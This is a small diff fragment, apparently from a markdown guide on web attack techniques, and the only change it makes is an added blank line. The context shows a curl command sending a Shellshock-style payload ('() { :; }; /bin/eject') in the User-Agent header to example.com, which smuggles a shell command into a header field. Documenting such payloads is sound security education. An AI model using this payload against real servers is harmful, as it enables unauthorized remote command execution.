@@ -19,3 +19,4 @@ If the target is running their application in debug mode you might be able to ru
 ```zsh
 curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
 ```
+
